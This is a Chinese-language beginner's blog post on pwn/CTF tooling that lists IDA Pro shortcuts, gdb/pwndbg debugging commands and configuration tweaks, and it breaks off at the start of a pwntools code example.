        <title>pwn入门-6-常见工具使用入门</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
        <content type="html">&lt;p&gt;寒假一回来,一段时间没用,有点手生了,觉得还是需要写一篇博客来梳理一下常见工具的使用.&lt;/p&gt;
&lt;p&gt;主要是静态分析、动态分析、脚本编写、小工具&lt;/p&gt;
&lt;h1 id=&#34;静态分析-IDA-pro&#34;&gt;&lt;a href=&#34;#静态分析-IDA-pro&#34; class=&#34;headerlink&#34; title=&#34;静态分析:IDA pro&#34;&gt;&lt;/a&gt;静态分析:IDA pro&lt;/h1&gt;&lt;h2 id=&#34;ida-里面很多奇怪的东西&#34;&gt;&lt;a href=&#34;#ida-里面很多奇怪的东西&#34; class=&#34;headerlink&#34; title=&#34;ida 里面很多奇怪的东西&#34;&gt;&lt;/a&gt;ida 里面很多奇怪的东西&lt;/h2&gt;&lt;p&gt;dword ptr&lt;/p&gt;
&lt;p&gt;qword ptr&lt;/p&gt;
&lt;p&gt;ida的数据类型:&lt;a href=&#34;https://blog.csdn.net/m0_43406494/article/details/109110983&#34;&gt;https://blog.csdn.net/m0_43406494/article/details/109110983&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;图形模式&#34;&gt;&lt;a href=&#34;#图形模式&#34; class=&#34;headerlink&#34; title=&#34;图形模式&#34;&gt;&lt;/a&gt;图形模式&lt;/h2&gt;&lt;p&gt;设置一下这俩,行号和显示数据内容&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303204724726.png&#34; alt=&#34;image-20230303204724726&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;箭头&#34;&gt;&lt;a href=&#34;#箭头&#34; class=&#34;headerlink&#34; title=&#34;箭头&#34;&gt;&lt;/a&gt;箭头&lt;/h3&gt;&lt;p&gt;红色: 条件跳转没有被采用&lt;/p&gt;
&lt;p&gt;绿色: 条件跳转被采用&lt;/p&gt;
&lt;p&gt;蓝色: 无条件跳转被采用&lt;/p&gt;
&lt;p&gt;方向向上表示循环&lt;/p&gt;
&lt;h2 id=&#34;文本模式&#34;&gt;&lt;a href=&#34;#文本模式&#34; class=&#34;headerlink&#34; title=&#34;文本模式&#34;&gt;&lt;/a&gt;文本模式&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303205201647.png&#34; alt=&#34;image-20230303205201647&#34;&gt;&lt;/p&gt;
&lt;p&gt;在设置里可以打开 auto comments 自动注释&lt;/p&gt;
&lt;h3 id=&#34;视图文件操作&#34;&gt;&lt;a href=&#34;#视图文件操作&#34; class=&#34;headerlink&#34; title=&#34;视图文件操作&#34;&gt;&lt;/a&gt;视图文件操作&lt;/h3&gt;&lt;p&gt;选择Windows中的Reset Desktop返回默认 视图 &lt;/p&gt;
&lt;p&gt; 选择Windows中的Save Desktop保存这个 新视图&lt;/p&gt;
&lt;p&gt;配置文件吗??&lt;/p&gt;
&lt;p&gt;后退操作 esc&lt;/p&gt;
&lt;p&gt;前进操作 ctrl+enter&lt;/p&gt;
&lt;h2 id=&#34;常用快捷键&#34;&gt;&lt;a href=&#34;#常用快捷键&#34; class=&#34;headerlink&#34; title=&#34;常用快捷键:&#34;&gt;&lt;/a&gt;常用快捷键:&lt;/h2&gt;&lt;p&gt;Table 切换视图&lt;/p&gt;
&lt;p&gt;快捷键&lt;/p&gt;
&lt;p&gt;p 在汇编中函数开头使用p,从当前地址处解析为函数&lt;/p&gt;
&lt;p&gt;u&lt;/p&gt;
&lt;p&gt;c 转换成代码&lt;/p&gt;
&lt;h3 id=&#34;数据操作&#34;&gt;&lt;a href=&#34;#数据操作&#34; class=&#34;headerlink&#34; title=&#34;数据操作:&#34;&gt;&lt;/a&gt;数据操作:&lt;/h3&gt;&lt;p&gt;shift + f12 显示字符串string&lt;/p&gt;
&lt;p&gt;D – 设置数据 (Data)  1字节 2字节 4字节 8字节 进行循环 &lt;/p&gt;
&lt;p&gt;C – 设置代码 (Code) 设置为指令 &lt;/p&gt;
&lt;p&gt;A – 设置ASCII字符串 (ASCII)&lt;/p&gt;
&lt;p&gt;*设置数组 &lt;/p&gt;
&lt;p&gt;O – 设置地址偏移 (Offset) &lt;/p&gt;
&lt;p&gt;U – 取消定义 (Undefine) &lt;/p&gt;
&lt;p&gt;X – 交叉引用查找 (Cross-reference, Xref)&lt;/p&gt;
&lt;h3 id=&#34;函数操作&#34;&gt;&lt;a href=&#34;#函数操作&#34; class=&#34;headerlink&#34; title=&#34;函数操作&#34;&gt;&lt;/a&gt;函数操作&lt;/h3&gt;&lt;p&gt;P – 创建函数 Del – 删除函数 Ctrl+E – 修改函数(函数窗口)&lt;/p&gt;
&lt;p&gt;Alt+P 修改函数(反汇编窗口)&lt;/p&gt;
&lt;h3 id=&#34;伪代码操作&#34;&gt;&lt;a href=&#34;#伪代码操作&#34; class=&#34;headerlink&#34; title=&#34;伪代码操作&#34;&gt;&lt;/a&gt;伪代码操作&lt;/h3&gt;&lt;p&gt;N – 修改标识符名称 (Name) &lt;/p&gt;
&lt;p&gt;Y – 修改标识符类型 (tYpe) 比如int类型还是double还是什么&lt;/p&gt;
&lt;h3 id=&#34;搜索&#34;&gt;&lt;a href=&#34;#搜索&#34; class=&#34;headerlink&#34; title=&#34;搜索&#34;&gt;&lt;/a&gt;搜索&lt;/h3&gt;&lt;p&gt;alt+t查找字符串&lt;/p&gt;
&lt;p&gt;a 转换成字符串&lt;/p&gt;
&lt;p&gt;d 分开的字符&lt;/p&gt;
&lt;p&gt;G跳转指定地址&lt;/p&gt;
&lt;p&gt;x 交叉引用 (函数和数据都有)&lt;/p&gt;
&lt;p&gt;: 加一条注释&lt;/p&gt;
&lt;p&gt;; 所有交叉引用都会回显这个注释&lt;/p&gt;
&lt;h2 id=&#34;类型&#34;&gt;&lt;a href=&#34;#类型&#34; class=&#34;headerlink&#34; title=&#34;类型&#34;&gt;&lt;/a&gt;类型&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;WORD (w)  16位 无符号数值 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;DWORD (dw) 32位 无符号数值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;脚本编写&#34;&gt;&lt;a href=&#34;#脚本编写&#34; class=&#34;headerlink&#34; title=&#34;脚本编写&#34;&gt;&lt;/a&gt;脚本编写&lt;/h2&gt;&lt;h1 id=&#34;动态分析-gdb-pwndbg插件&#34;&gt;&lt;a href=&#34;#动态分析-gdb-pwndbg插件&#34; class=&#34;headerlink&#34; title=&#34;动态分析:gdb(pwndbg插件)&#34;&gt;&lt;/a&gt;动态分析:gdb(pwndbg插件)&lt;/h1&gt;&lt;p&gt;There are a number of good gdb crash courses &amp;#x2F; reference manuals:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://sourceware.org/gdb/onlinedocs/gdb/index.html&#34;&gt;GDB’s documentation&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://users.umiacs.umd.edu/~tdumitra/courses/ENEE757/Fall15/misc/gdb_tutorial.html&#34;&gt;Tudor’s gdb crash course&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html&#34;&gt;gdb debugging full example&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md&#34;&gt;pwndbg: a gdb extension (feature list)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://hugsy.github.io/gef/commands/aliases/&#34;&gt;gef: another gdb extension (feature list)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The course &lt;a href=&#34;https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/&#34;&gt;Debuggers 1012: Introductory GDB&lt;/a&gt; from OpenSecurityTraining2.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pwn.college &lt;a href=&#34;https://www.youtube.com/watch?v=r185fCzdw8Y&#34;&gt;https://www.youtube.com/watch?v=r185fCzdw8Y&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwndbg官方文档:&lt;a href=&#34;https://browserpwndbg.readthedocs.io/en/docs/&#34;&gt;https://browserpwndbg.readthedocs.io/en/docs/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md&#34;&gt;https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gdb官方文档:&lt;/p&gt;
&lt;h3 id=&#34;调整&#34;&gt;&lt;a href=&#34;#调整&#34; class=&#34;headerlink&#34; title=&#34;调整&#34;&gt;&lt;/a&gt;调整&lt;/h3&gt;&lt;p&gt;把 stack 和 backtrace的行数减少,不然看不见上面的汇编了&lt;/p&gt;
&lt;p&gt;配置文件:&lt;a href=&#34;https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md&#34;&gt;https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;修改配置文件就可以了&lt;/p&gt;
&lt;p&gt;找到pwndbg的下载目录的这个文件&lt;a href=&#34;https://github.com/pwndbg/pwndbg&#34;&gt;pwndbg&lt;/a&gt;&amp;#x2F;&lt;a href=&#34;https://github.com/pwndbg/pwndbg/tree/dev/pwndbg&#34;&gt;pwndbg&lt;/a&gt;&amp;#x2F;&lt;a href=&#34;https://github.com/pwndbg/pwndbg/tree/dev/pwndbg/commands&#34;&gt;commands&lt;/a&gt;&amp;#x2F;&lt;strong&gt;context.py&lt;/strong&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;751行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_lines = pwndbg.gdblib.config.add_param(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;context-stack-lines&amp;quot;, 8, &amp;quot;number of lines to print in the stack context&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;766行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backtrace_lines = pwndbg.gdblib.config.add_param(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;context-backtrace-lines&amp;quot;, 8, &amp;quot;number of lines to print in the backtrace context&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;启动调试&#34;&gt;&lt;a href=&#34;#启动调试&#34; class=&#34;headerlink&#34; title=&#34;启动调试&#34;&gt;&lt;/a&gt;启动调试&lt;/h3&gt;&lt;p&gt;gdb filename&lt;/p&gt;
&lt;p&gt;gdb processName PID 或者 gdb -p &lt;PID&gt;&lt;/PID&gt;&lt;/p&gt;
&lt;p&gt;添加参数 &lt;/p&gt;
&lt;p&gt;gdb -args .&amp;#x2F;a.out a b c&lt;/p&gt;
&lt;h3 id=&#34;断点相关&#34;&gt;&lt;a href=&#34;#断点相关&#34; class=&#34;headerlink&#34; title=&#34;断点相关&#34;&gt;&lt;/a&gt;断点相关&lt;/h3&gt;&lt;p&gt;b 函数名,如果有符号表的话可以,例如b gets&lt;/p&gt;
&lt;p&gt;b 地址  例如:b *0x3123213  这样打&lt;/p&gt;
&lt;p&gt;info b 查看断点信息&lt;/p&gt;
&lt;p&gt;delete n 删除n号断点&lt;/p&gt;
&lt;h3 id=&#34;运行&#34;&gt;&lt;a href=&#34;#运行&#34; class=&#34;headerlink&#34; title=&#34;运行&#34;&gt;&lt;/a&gt;运行&lt;/h3&gt;&lt;p&gt;r 运行程序,会一直运行,直到比如需要输入什么东西等&lt;/p&gt;
&lt;p&gt;s 从头开始运行,断到第一行&lt;/p&gt;
&lt;p&gt;c 运行到下一个断点&lt;/p&gt;
&lt;p&gt;调试地址 就是 这个程序的基地址 + ida中的地址&lt;/p&gt;
&lt;p&gt;n 单步执行,(有函数的话直接跳过不进入)&lt;/p&gt;
&lt;p&gt;s 单步进入,有函数的话会进入&lt;/p&gt;
&lt;p&gt;finish 执行完当前函数,返回调用它的函数&lt;/p&gt;
&lt;p&gt;怎么查看自己当前在哪一行??和下面的代码??&lt;/p&gt;
&lt;p&gt;disass &lt;/p&gt;
&lt;p&gt;运行的时候 怎么 添加参数?&lt;/p&gt;
&lt;h3 id=&#34;查看信息&#34;&gt;&lt;a href=&#34;#查看信息&#34; class=&#34;headerlink&#34; title=&#34;查看信息&#34;&gt;&lt;/a&gt;查看信息&lt;/h3&gt;&lt;p&gt;codebase 查看地址 (调试地址 就是 这个程序的基地址 + ida中的地址)&lt;/p&gt;
&lt;p&gt;vmmap查看内存映射mmap地址 信息&lt;/p&gt;
&lt;p&gt;teles 查看栈的信息&lt;/p&gt;
&lt;p&gt;p  变量名 查看变量地址&lt;/p&gt;
&lt;p&gt;info &lt;/p&gt;
&lt;p&gt;reg 查看寄存器信息&lt;/p&gt;
&lt;p&gt;dereference $esp 是啥??&lt;/p&gt;
&lt;h4 id=&#34;查看内存信息&#34;&gt;&lt;a href=&#34;#查看内存信息&#34; class=&#34;headerlink&#34; title=&#34;查看内存信息&#34;&gt;&lt;/a&gt;查看内存信息&lt;/h4&gt;&lt;p&gt;使用examine命令（简写是x）来查看内存地址中的值&lt;/p&gt;
&lt;p&gt;x&amp;#x2F;nuf &lt;addr&gt; 例如x &amp;#x2F;20wx 0x0000000&lt;/addr&gt;&lt;/p&gt;
&lt;p&gt;n是个数,表示从当前地址往后显示的内存的长度,即显示几个地址的内容&lt;/p&gt;
&lt;p&gt;u表示,从当前地址往后请求的字节数,不指定的话默认4bytes,32位.b表示单字节，h表示双字节，w表示四字节，g表示八字节。&lt;/p&gt;
&lt;p&gt; f是显示的格式( i可以查看汇编代码)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20220929162158033.png&#34; alt=&#34;image-20220929162158033&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4b&lt;/span&gt;x &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;hx &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x8000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00008000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x55554759&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005555&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000100008000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000555555554759&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe4a0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa2698e7a0212c01a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;堆相关&#34;&gt;&lt;a href=&#34;#堆相关&#34; class=&#34;headerlink&#34; title=&#34;堆相关&#34;&gt;&lt;/a&gt;堆相关&lt;/h3&gt;&lt;p&gt;heap 查看堆的信息&lt;/p&gt;
&lt;p&gt;heap bins 查看bins的信息&lt;/p&gt;
&lt;p&gt;heap chunks 查看chunk的信息&lt;/p&gt;
&lt;p&gt;Vis 查看堆内存&lt;/p&gt;
&lt;h3 id=&#34;修改内存、寄存器等-方便调试&#34;&gt;&lt;a href=&#34;#修改内存、寄存器等-方便调试&#34; class=&#34;headerlink&#34; title=&#34;修改内存、寄存器等 方便调试&#34;&gt;&lt;/a&gt;修改内存、寄存器等 方便调试&lt;/h3&gt;&lt;p&gt;set $eip &amp;#x3D; xxxx&lt;/p&gt;
&lt;p&gt;set {unsigned int}0x8048a51&amp;#x3D;0x0&lt;/p&gt;
&lt;p&gt;find 内存搜索&lt;/p&gt;
&lt;h3 id=&#34;其他&#34;&gt;&lt;a href=&#34;#其他&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h3&gt;&lt;p&gt;watch 监测点?&lt;/p&gt;
&lt;p&gt;canary&lt;/p&gt;
&lt;p&gt;q 退出&lt;/p&gt;
&lt;p&gt;display &amp;#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令&lt;/p&gt;
&lt;p&gt;查看寄存器&lt;/p&gt;
&lt;p&gt;(gdb) i r (gdb) i r a # 查看所有&lt;a href=&#34;https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&amp;spm=1001.2101.3001.7020&#34;&gt;寄存器&lt;/a&gt;（包括&lt;a href=&#34;https://so.csdn.net/so/search?q=%E6%B5%AE%E7%82%B9&amp;spm=1001.2101.3001.7020&#34;&gt;浮点&lt;/a&gt;、多媒体） (gdb) i r esp (gdb) i r pc&lt;/p&gt;
&lt;p&gt;info reg&lt;/p&gt;
&lt;p&gt;调试一下输出为16进制吧: set output-radix 16&lt;/p&gt;
&lt;p&gt;eb address [data [data …]]&lt;/p&gt;
&lt;h3 id=&#34;结构体相关&#34;&gt;&lt;a href=&#34;#结构体相关&#34; class=&#34;headerlink&#34; title=&#34;结构体相关&#34;&gt;&lt;/a&gt;结构体相关&lt;/h3&gt;&lt;p&gt;p 结构体名字&lt;/p&gt;
&lt;p&gt;p *(struct  xxx *) addr&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(DSI *) dsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;value of type `DSI&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt; requires &lt;span class=&#34;number&#34;&gt;67416&lt;/span&gt; bytes, which is more than max-value-size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p dsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = (DSI *) &lt;span class=&#34;number&#34;&gt;0x5555555b8960&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(DSI *) &lt;span class=&#34;number&#34;&gt;0x5555555b8960&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;value of type `DSI&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt; requires &lt;span class=&#34;number&#34;&gt;67416&lt;/span&gt; bytes, which is more than max-value-size&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;调试技巧&#34;&gt;&lt;a href=&#34;#调试技巧&#34; class=&#34;headerlink&#34; title=&#34;调试技巧&#34;&gt;&lt;/a&gt;调试技巧&lt;/h2&gt;&lt;p&gt;下好断点,然后多用c,在堆的调试中很好用&lt;/p&gt;
&lt;p&gt;pwntools中加input()&lt;/p&gt;
&lt;p&gt;gdb中怎么看文件描述符呢,有多少个,打开的  ll &amp;#x2F;proc&amp;#x2F;1562844&amp;#x2F;fd 需要看进程信息&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/mfryf/p/5329770.html&#34;&gt;https://www.cnblogs.com/mfryf/p/5329770.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;vmmap 查看内存分布&lt;/p&gt;
&lt;h3 id=&#34;子进程调试&#34;&gt;&lt;a href=&#34;#子进程调试&#34; class=&#34;headerlink&#34; title=&#34;子进程调试&#34;&gt;&lt;/a&gt;子进程调试&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/cjfeii/article/details/21647663&#34;&gt;https://blog.csdn.net/cjfeii/article/details/21647663&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;set detach-on-fork off&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有好几种模式&lt;/p&gt;
&lt;p&gt;info threads&lt;/p&gt;
&lt;p&gt;切换线程&lt;/p&gt;
&lt;p&gt; info inferiors&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/bsp_mpu6050/article/details/107886383&#34;&gt;https://blog.csdn.net/bsp_mpu6050/article/details/107886383&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;脚本编写-pwntools&#34;&gt;&lt;a href=&#34;#脚本编写-pwntools&#34; class=&#34;headerlink&#34; title=&#34;脚本编写:pwntools&#34;&gt;&lt;/a&gt;脚本编写:pwntools&lt;/h1&gt;&lt;p&gt;官方文档:&lt;a href=&#34;https://docs.pwntools.com/&#34;&gt;https://docs.pwntools.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html&#34;&gt;https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span 